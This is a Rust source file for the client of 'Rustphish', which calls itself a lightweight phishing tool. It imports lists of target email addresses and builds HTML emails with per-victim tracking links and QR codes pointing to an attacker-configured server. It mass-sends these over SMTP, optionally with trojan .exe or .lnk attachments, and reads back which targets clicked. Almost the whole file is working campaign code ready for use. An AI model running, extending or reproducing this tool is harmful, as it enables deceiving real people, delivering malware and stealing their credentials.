use clap::{Arg, Command};
use colored::*;
use serde::Deserialize;
use std::error::Error;
use std::fs::{self, create_dir_all};
use std::path::Path;
use std::thread;
use std::time::Duration;

#[cfg(feature = "mail")]
use rpassword::read_password;

#[cfg(feature = "mail")]
mod smtp;

#[cfg(feature = "mail")]
pub mod malware;

#[cfg(feature = "mail")]
pub mod qr;

#[cfg(feature = "db")]
mod db;

#[derive(Deserialize)]
struct ClientConfig {
    server: ServerConfig,
    smtp: SmtpConfig,
    email: EmailConfig,
}

#[derive(Deserialize)]
struct SmtpConfig {
    server: String,
    username: String,
    from_email: String,
    subject: String,
    interval: u64, // 发送间隔（秒）
}

#[derive(Deserialize)]
struct ServerConfig {
    ip_or_domain: String, // 邮件模板路径
    port: u16, //附件木马的文件名
}

#[derive(Deserialize)]
struct EmailConfig {
    template: String, // 邮件模板路径
    original_appendix_path_exe: String,
    appendix_name_for_sending_exe: String, //附件木马的文件名
    appendix_name_for_sending_lnk: String, 
}

const BANNER: &str = r#"
██████╗ ██╗   ██╗███████╗████████╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
██╔══██╗██║   ██║██╔════╝╚══██╔══╝██╔══██╗██║  ██║██║██╔════╝██║  ██║
██████╔╝██║   ██║███████╗   ██║   ██████╔╝███████║██║███████╗███████║
██╔══██╗██║   ██║╚════██║   ██║   ██╔═══╝ ██╔══██║██║╚════██║██╔══██║
██║  ██║╚██████╔╝███████║   ██║   ██║     ██║  ██║██║███████║██║  ██║
╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
                                                            [Client v1.0]
"#;

pub fn print_status(status: &str, message: &str) {
    println!("[{}] {}", status.bold(), message);
}

pub fn print_success(message: &str) {
    print_status(&"✓".green(), message);
}

pub fn print_error(message: &str) {
    print_status(&"✗".red(), message);
}

pub fn print_info(message: &str) {
    print_status(&"i".blue(), message);
}

fn generate_phishing_emails(
    email_tree: &sled::Tree,
    template_path: &str,
    config: ClientConfig,
) -> Result<(), Box<dyn Error>> {
    let output_dir = Path::new("./generate");
    create_dir_all(output_dir)?;

    let template = fs::read_to_string(template_path)?;
    let emails = db::get_all_emails(&email_tree)?;

    print_info(&format!("找到 {} 个目标邮箱", emails.len()));

    for entry in emails {
        let index_url = format!("http://{}:{}/index/{}", &config.server.ip_or_domain, &config.server.port, &entry.id);
        let image_url = format!("http://{}:{}/image/{}", &config.server.ip_or_domain, &config.server.port, &entry.id);

        let content = template.replace("{{index}}", &index_url);
        let content = content.replace("{{image}}", &image_url);
        // let content = template.replace("{{id}}", &entry.id);
        let file_name = format!("generate/{}.html", entry.email);
        fs::write(&file_name, content)?;
        print_success(&format!("生成 {}", file_name));
    }

    Ok(())
}

#[cfg(feature = "mail")]
async fn send_multi_emails(
    email_tree: &sled::Tree,
    config: ClientConfig,
    password: String,
    from: u16,
    to: u16,
    is_exe_appendix: bool,
    is_lnk_appendix: bool
) -> Result<(), Box<dyn Error>> {
    let appendix_name_for_sending_exe: &str = match is_exe_appendix {
        true => {
            &config.email.appendix_name_for_sending_exe
        }
        false => {
            ""
        }
    }; 

    let template_exe_path: &str = match is_exe_appendix {
        true => {
            &config.email.original_appendix_path_exe
        }
        false => {
            ""
        }
    }; 

    let appendix_name_for_sending_lnk: &str = match is_lnk_appendix {
        true => {
            &config.email.appendix_name_for_sending_lnk
        }
        false => {
            ""
        }
    }; 


    let emails = db::get_all_emails(&email_tree)?;
    let end = std::cmp::min(to, emails.len().try_into().unwrap());
    let new_emails = &emails[from as usize..end as usize];

    print_info(&format!("找到 {} 个目标邮箱", new_emails.len()));

    // 读取邮件模板
    let template = fs::read_to_string(&config.email.template)?;

    // 验证SMTP凭证
    print_info("验证SMTP凭证...");
    smtp::verify_smtp_credentials(&config.smtp.server, &config.smtp.username, &password)?;
    print_success("SMTP凭证验证成功");

    // 发送邮件
    for entry in new_emails {
        // let content = template.replace("{{id}}", &entry.id);
        let index_url = format!("http://{}:{}/index/{}", &config.server.ip_or_domain, &config.server.port, &entry.id);
        let image_url = format!("http://{}:{}/image/{}", &config.server.ip_or_domain, &config.server.port, &entry.id);
        let server_url = format!("http://{}:{}", &config.server.ip_or_domain, &config.server.port);

        let content = template.replace("{{index}}", &index_url);
        let content = content.replace("{{image}}", &image_url);

        let content = if content.contains("{{qrcode}}") {
            let qrimg = qr::generate_qrcode_html(&index_url)?;
            let content = content.replace("{{qrcode}}", &qrimg);
            print_success(&format!("生成二维码成功(ID: {})", entry.id));
            content
        } else {
            content
        };

        // 创建临时文件存储当前邮件内容
        let temp_dir = Path::new("./temp");
        create_dir_all(temp_dir)?;
        let temp_file = format!("temp/{}.html", entry.id);
        fs::write(&temp_file, &content)?;

        print_info(&format!("正在发送邮件到 {}", entry.email));

        match smtp::send_html_email(
            &config.smtp.server,
            &temp_file,
            &entry.email,
            &config.smtp.subject,
            &config.smtp.from_email,
            &config.smtp.username,
            &password,
            template_exe_path,
            &server_url,
            &entry.id,
            appendix_name_for_sending_exe,
            appendix_name_for_sending_lnk,
        ) {
            Ok(_) => print_success(&format!("发送成功: {}", entry.email)),
            Err(e) => print_error(&format!("发送失败 {}: {}", entry.email, e)),
        }

        // 删除临时文件
        fs::remove_file(&temp_file)?;

        // 等待指定时间间隔
        thread::sleep(Duration::from_secs(config.smtp.interval));
    }

    // 清理临时目录
    fs::remove_dir("./temp")?;

    Ok(())
}

#[cfg(feature = "mail")]
async fn send_phishing_emails(
    email_tree: &sled::Tree,
    config: ClientConfig,
    password: String,
    is_exe_appendix: bool,
    is_lnk_appendix: bool,
) -> Result<(), Box<dyn Error>> {
    let appendix_name_for_sending_exe: &str = match is_exe_appendix {
        true => {
            &config.email.appendix_name_for_sending_exe
        }
        false => {
            ""
        }
    }; 

    let template_exe_path: &str = match is_exe_appendix {
        true => {
            &config.email.original_appendix_path_exe
        }
        false => {
            ""
        }
    }; 

    let appendix_name_for_sending_lnk: &str = match is_lnk_appendix {
        true => {
            &config.email.appendix_name_for_sending_lnk
        }
        false => {
            ""
        }
    }; 


    let emails = db::get_all_emails(&email_tree)?;

    print_info(&format!("找到 {} 个目标邮箱", emails.len()));

    // 读取邮件模板
    let template = fs::read_to_string(&config.email.template)?;

    // 验证SMTP凭证
    print_info("验证SMTP凭证...");
    smtp::verify_smtp_credentials(&config.smtp.server, &config.smtp.username, &password)?;
    print_success("SMTP凭证验证成功");

    // 发送邮件
    for entry in emails {
        // let content = template.replace("{{id}}", &entry.id);
        let index_url = format!("http://{}:{}/index/{}", &config.server.ip_or_domain, &config.server.port, &entry.id);
        let image_url = format!("http://{}:{}/image/{}", &config.server.ip_or_domain, &config.server.port, &entry.id);
        let server_url = format!("http://{}:{}", &config.server.ip_or_domain, &config.server.port);

        let content = template.replace("{{index}}", &index_url);
        let content = content.replace("{{image}}", &image_url);

        let content = if content.contains("{{qrcode}}") {
            let qrimg = qr::generate_qrcode_html(&index_url)?;
            let content = content.replace("{{qrcode}}", &qrimg);
            print_success(&format!("生成二维码成功(ID: {})", entry.id));
            content
        } else {
            content
        };

        // 创建临时文件存储当前邮件内容
        let temp_dir = Path::new("./temp");
        create_dir_all(temp_dir)?;
        let temp_file = format!("temp/{}.html", entry.id);
        fs::write(&temp_file, &content)?;

        print_info(&format!("正在发送邮件到 {}", entry.email));

        match smtp::send_html_email(
            &config.smtp.server,
            &temp_file,
            &entry.email,
            &config.smtp.subject,
            &config.smtp.from_email,
            &config.smtp.username,
            &password,
            template_exe_path,
            &server_url,
            &entry.id,
            appendix_name_for_sending_exe,
            appendix_name_for_sending_lnk,
        ) {
            Ok(_) => print_success(&format!("发送成功: {}", entry.email)),
            Err(e) => print_error(&format!("发送失败 {}: {}", entry.email, e)),
        }

        // 删除临时文件
        fs::remove_file(&temp_file)?;

        // 等待指定时间间隔
        thread::sleep(Duration::from_secs(config.smtp.interval));
    }

    // 清理临时目录
    fs::remove_dir("./temp")?;

    Ok(())
}

#[cfg(feature = "mail")]
async fn send_single_email(
    email_tree: &sled::Tree,
    config: &ClientConfig,
    target_id: &str,
    password: &str,
    is_exe_appendix: bool,
    is_lnk_appendix: bool,
) -> Result<(), Box<dyn Error>> {
    let appendix_name_for_sending_exe: &str = match is_exe_appendix {
        true => {
            &config.email.appendix_name_for_sending_exe
        }
        false => {
            ""
        }
    }; 

    let template_exe_path: &str = match is_exe_appendix {
        true => {
            &config.email.original_appendix_path_exe
        }
        false => {
            ""
        }
    }; 

    let appendix_name_for_sending_lnk: &str = match is_lnk_appendix {
        true => {
            &config.email.appendix_name_for_sending_lnk
        }
        false => {
            ""
        }
    }; 

    // 查找目标邮箱
    match email_tree.get(target_id.as_bytes())? {
        Some(value) => {
            let entry: db::EmailEntry = bincode::deserialize(&value)?;
            let template = fs::read_to_string(&config.email.template)?;
            let index_url = format!("http://{}:{}/index/{}", &config.server.ip_or_domain, &config.server.port, &entry.id);
            let image_url = format!("http://{}:{}/image/{}", &config.server.ip_or_domain, &config.server.port, &entry.id);
            let server_url = format!("http://{}:{}", &config.server.ip_or_domain, &config.server.port);

            let content = template.replace("{{index}}", &index_url);
            let content = content.replace("{{image}}", &image_url);

            let content = if content.contains("{{qrcode}}") {
                let qrimg = qr::generate_qrcode_html(&index_url)?;
                let content = content.replace("{{qrcode}}", &qrimg);
                print_success(&format!("生成二维码成功(ID: {})", entry.id));
                content
            } else {
                content
            };


            // 创建临时文件
            let temp_dir = Path::new("./temp");
            create_dir_all(temp_dir)?;
            let temp_file = format!("temp/{}.html", entry.id);
            fs::write(&temp_file, &content)?;

            print_info(&format!("正在发送邮件到 {}", entry.email));

            match smtp::send_html_email(
                &config.smtp.server,
                &temp_file,
                &entry.email,
                &config.smtp.subject,
                &config.smtp.from_email,
                &config.smtp.username,
                password,
                template_exe_path,
                &server_url,
                &entry.id,
                appendix_name_for_sending_exe,
                appendix_name_for_sending_lnk,
            ) {
                Ok(_) => print_success(&format!("发送成功: {}", entry.email)),
                Err(e) => print_error(&format!("发送失败 {}: {}", entry.email, e)),
            }

            // 清理临时文件
            fs::remove_file(&temp_file)?;
            Ok(())
        }
        None => {
            print_error(&format!("未找到ID为 {} 的邮箱", target_id));
            Err(Box::new(std::io::Error::new(
                std::io::ErrorKind::NotFound,
                "Email ID not found",
            )))
        }
    }
}

fn show_all_emails(email_tree: &sled::Tree) -> Result<(), Box<dyn Error>> {
    let emails = db::get_all_emails(email_tree)?;

    if emails.is_empty() {
        print_info("数据库中没有邮箱记录");
        return Ok(());
    }

    print_success(&format!("共找到 {} 个邮箱", emails.len()));

    println!("\n{:=^50}", " 邮箱列表 ");
    println!("{:<15} {}", "ID", "邮箱地址");
    println!("{:-<50}", "");

    for entry in emails {
        println!("{:<15} {}", entry.id, entry.email);
    }
    println!("{:=^50}\n", "");

    Ok(())
}


fn main() -> Result<(), Box<dyn Error>> {
    println!("{}", BANNER.bright_cyan());

    #[cfg(feature = "db")]
    const DB_PATH: &str = "email_database";
    #[cfg(feature = "db")]
    const EMAIL_TREE: &str = "emails";

    let mut app = Command::new("Rustphish Client")
        .version("1.0")
        .author("Ky9oss")
        .about("轻量级邮件钓鱼工具");

    #[cfg(feature = "db")]
    {
        app = app
            .arg(
                Arg::new("read")
                    .short('r')
                    .long("read")
                    .value_name("DATABASE")
                    .help("读取并格式化显示钓鱼记录"),
            )
            .arg(
                Arg::new("input")
                    .short('i')
                    .long("input")
                    .value_name("EMAIL_LIST")
                    .help("从文件导入目标邮箱列表"),
            )
            .arg(
                Arg::new("show")
                    .long("show")
                    .help("显示所有目标邮箱")
                    .num_args(0),
            )
            .arg(
                Arg::new("delete")
                    .short('d')
                    .long("delete")
                    .value_name("ID")
                    .help("删除指定ID的邮箱记录"),
            );
    }

    #[cfg(feature = "mail")]
    {
        app = app
            .arg(
                Arg::new("generate")
                    .short('g')
                    .long("generate")
                    .value_name("TEMPLATE")
                    .help("根据模板生成钓鱼邮件"),
            )
            .arg(
                Arg::new("send-all")
                    .long("send-all")
                    .help("向所有目标发送钓鱼邮件")
                    .num_args(0),
            )
            .arg(
                Arg::new("send")
                    .long("send")
                    .value_name("ID")
                    .help("向指定ID的目标发送钓鱼邮件"),
            )
            .arg(
                Arg::new("send-from-to")
                    .long("send-from-to")
                    .value_name("ft")
                    .help("发送邮件区间"),
            )
            .arg(
                Arg::new("appendix-exe")
                    .long("appendix-exe")
                    .help("使用exe附件钓鱼")
                    .num_args(0),
            )
            .arg(
                Arg::new("appendix-lnk")
                    .long("appendix-lnk")
                    .help("使用lnk附件钓鱼")
                    .num_args(0),
            )
            .arg(
                Arg::new("zip")
                    .long("zip")
                    .help("使用zip附件钓鱼")
                    .num_args(0),
            )
    }

    let matches = app.clone().get_matches();

    // 数据库相关功能
    #[cfg(feature = "db")]
    {
        if let Some(db_path) = matches.get_one::<String>("read") {
            print_info(&format!("正在读取数据库: {}", db_path));

            let db_server = match sled::open(db_path) {
                Ok(db) => {
                    print_success("服务器数据库打开成功");
                    db
                }
                Err(e) => {
                    print_error(&format!("打开服务器数据库失败: {}", e));
                    return Err(Box::new(e));
                }
            };

            let action_tree = match db_server.open_tree("actions") {
                Ok(tree) => tree,
                Err(e) => {
                    print_error(&format!("打开actions表失败: {}", e));
                    return Err(Box::new(e));
                }
            };

            let data_tree = match db_server.open_tree("data") {
                Ok(tree) => tree,
                Err(e) => {
                    print_error(&format!("打开data表失败: {}", e));
                    return Err(Box::new(e));
                }
            };

            let db_client = match sled::open(DB_PATH) {
                Ok(db) => db,
                Err(e) => {
                    print_error(&format!("打开客户端数据库失败: {}", e));
                    return Err(Box::new(e));
                }
            };

            let email_tree = match db_client.open_tree(EMAIL_TREE) {
                Ok(tree) => tree,
                Err(e) => {
                    print_error(&format!("打开email表失败: {}", e));
                    return Err(Box::new(e));
                }
            };

            match db::traverse_actions(&action_tree, &data_tree, &email_tree) {
                Ok(_) => (),
                Err(e) => {
                    print_error(&format!("遍历钓鱼记录失败: {}", e));
                    return Err(e);
                }
            }
        } else if let Some(input_path) = matches.get_one::<String>("input") {
            print_info(&format!("正在导入邮箱列表: {}", input_path));

            let db = sled::open(DB_PATH)?;
            let email_tree = db.open_tree(EMAIL_TREE)?;

            match db::load_emails_to_db(&email_tree, input_path) {
                Ok(_) => print_success("邮箱列表导入成功"),
                Err(e) => print_error(&format!("导入失败: {}", e)),
            }
        } else if matches.get_flag("show") {
            let db = sled::open(DB_PATH)?;
            let email_tree = db.open_tree(EMAIL_TREE)?;

            show_all_emails(&email_tree)?;
        } else if let Some(id) = matches.get_one::<String>("delete") {
            let db = sled::open(DB_PATH)?;
            let email_tree = db.open_tree(EMAIL_TREE)?;

            if let Err(e) = db::delete_email_by_id(&email_tree, id) {
                print_error(&format!("删除失败: {}", e));
            }
        }
    }

    // 邮件相关功能
    #[cfg(feature = "mail")]
    {
        if let Some(template_path) = matches.get_one::<String>("generate") {
            let config_path = "client_config.toml";
            if !Path::new(config_path).exists() {
                print_error("找不到配置文件 client_config.toml");
                return Ok(());
            }

            let config: ClientConfig = toml::from_str(&fs::read_to_string(config_path)?)?;

            if !Path::new(&config.email.template).exists() {
                print_error(&format!("找不到邮件模板文件 {}", config.email.template));
                return Ok(());
            }

            print_info(&format!("正在生成钓鱼邮件: {}", template_path));
            let db = sled::open(DB_PATH)?;
            let email_tree = db.open_tree(EMAIL_TREE)?;

            match generate_phishing_emails(&email_tree, template_path, config) {
                Ok(_) => print_success("所有钓鱼邮件生成完成"),
                Err(e) => print_error(&format!("生成失败: {}", e)),
            }
        } else if matches.get_flag("send-all") {
            // 检查配置文件
            let config_path = "client_config.toml";
            if !Path::new(config_path).exists() {
                print_error("找不到配置文件 client_config.toml");
                return Ok(());
            }

            let config: ClientConfig = toml::from_str(&fs::read_to_string(config_path)?)?;

            if !Path::new(&config.email.template).exists() {
                print_error(&format!("找不到邮件模板文件 {}", config.email.template));
                return Ok(());
            }

            let db = sled::open(DB_PATH)?;
            let email_tree = db.open_tree(EMAIL_TREE)?;

            print_info("请输入SMTP密码：");
            let password = read_password()?;

            let is_exe_appendix = matches.get_flag("appendix-exe");             
            let is_lnk_appendix = matches.get_flag("appendix-lnk");
            print_info("开始批量发送邮件");

            let rt = tokio::runtime::Runtime::new()?;
            rt.block_on(async {
                    send_phishing_emails(&email_tree, config, password, is_exe_appendix, is_lnk_appendix).await?;
                Ok::<(), Box<dyn Error>>(())
            })?;
            print_success("所有邮件发送完成");
        } else if let Some(target_id) = matches.get_one::<String>("send") {
            // 检查配置文件
            let config_path = "client_config.toml";
            if !Path::new(config_path).exists() {
                print_error("找不到配置文件 client_config.toml");
                return Ok(());
            }

            let config: ClientConfig = toml::from_str(&fs::read_to_string(config_path)?)?;

            if !Path::new(&config.email.template).exists() {
                print_error(&format!("找不到邮件模板文件 {}", config.email.template));
                return Ok(());
            }

            let db = sled::open(DB_PATH)?;
            let email_tree = db.open_tree(EMAIL_TREE)?;

            print_info("请输入SMTP密码：");
            let password = read_password()?;

            let is_exe_appendix = matches.get_flag("appendix-exe");             
            let is_lnk_appendix = matches.get_flag("appendix-lnk");
            print_info("开始批量发送邮件");

            let rt = tokio::runtime::Runtime::new()?;
            rt.block_on(async {
                    send_single_email(&email_tree, &config, target_id, &password, is_exe_appendix, is_lnk_appendix).await?;
                Ok::<(), Box<dyn Error>>(())
            })?;

        } else if let Some(ft) = matches.get_one::<String>("send-from-to") {
            // 检查配置文件
            let config_path = "client_config.toml";
            if !Path::new(config_path).exists() {
                print_error("找不到配置文件 config.toml");
                return Ok(());
            }

            let config: ClientConfig = toml::from_str(&fs::read_to_string(config_path)?)?;

            if !Path::new(&config.email.template).exists() {
                print_error(&format!("找不到邮件模板文件 {}", config.email.template));
                return Ok(());
            }

            let db = sled::open(DB_PATH)?;
            let email_tree = db.open_tree(EMAIL_TREE)?;

            print_info("请输入SMTP密码：");
            let password = read_password()?;

            let from_to: Vec<u16> = ft.split('-').map(|x| x.parse().unwrap()).collect();
            let from = from_to[0];
            let to = from_to[1];

            let is_exe_appendix = matches.get_flag("appendix-exe");             
            let is_lnk_appendix = matches.get_flag("appendix-lnk");
            print_info("开始批量发送邮件");

            let rt = tokio::runtime::Runtime::new()?;
            rt.block_on(async {
                    send_multi_emails(&email_tree, config, password, from, to, is_exe_appendix, is_lnk_appendix).await?;
                Ok::<(), Box<dyn Error>>(())
            })?;
        } 
    }

    // 如果没有匹配任何命令
    if !matches.args_present() {
        app.print_help()?;
        println!();
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;
    use tempfile::NamedTempFile;

    // 辅助函数：创建临时配置文件
    fn create_test_config() -> Result<NamedTempFile, Box<dyn Error>> {
        let config_content = r#"
[smtp]
server = "smtp.126.com"
username = "test@126.com"
from_email = "Test <test@126.com>"
subject = "Test Subject"
interval = 1

[email]
template = "template.html"
"#;
        let mut file = NamedTempFile::new()?;
        file.write_all(config_content.as_bytes())?;
        Ok(file)
    }

    // 辅助函数：创建临时邮件模板
    fn create_test_template() -> Result<NamedTempFile, Box<dyn Error>> {
        let template_content = "<html><body>ID: {{id}}</body></html>";
        let mut file = NamedTempFile::new()?;
        file.write_all(template_content.as_bytes())?;
        Ok(file)
    }

    // 辅助函数：创建测试数据库
    fn setup_test_db() -> Result<(sled::Db, sled::Tree), Box<dyn Error>> {
        let db = sled::open("test_email_database")?;
        let tree = db.open_tree("emails")?;

        // 添加测试数据
        let entry = db::EmailEntry {
            id: "test1".to_string(),
            email: "test1@example.com".to_string(),
        };
        tree.insert(entry.id.as_bytes(), bincode::serialize(&entry)?)?;

        Ok((db, tree))
    }

    // 测试打印函数
    #[test]
    fn test_print_functions() {
        print_info("测试信息");
        print_success("测试成功");
        print_error("测试错误");
        assert!(true); // 如果打印没有panic就算通过
    }

    #[cfg(feature = "mail")]
    use qrcode::QrCode;

    #[cfg(feature = "mail")]
    use image::Luma;

    #[cfg(feature = "mail")]
    #[test]
    fn test_qrcode() {
        let url = "https://baidu.com/";
        
        // 转换为字节数据（使用 as_bytes()）
        let code = QrCode::new(url.as_bytes()).unwrap();

        // 生成并保存图片
        let image = code.render::<Luma<u8>>()
            .quiet_zone(false)       // 是否保留空白边距
            .min_dimensions(300, 300) // 最小尺寸
            .build();
        image.save("qrcode.png").unwrap();
        assert!(true);
    }

    #[cfg(feature = "mail")]
    #[test]
    fn test_qrcode_html() {
        let html_img = qr::generate_qrcode_html("https://baidu.com/")
            .expect("生成二维码失败");
        
        println!("直接嵌入HTML的用法：");
        println!("<img src=\"{}\" alt=\"QR Code\"/>", html_img);
        assert!(true);
    }
}
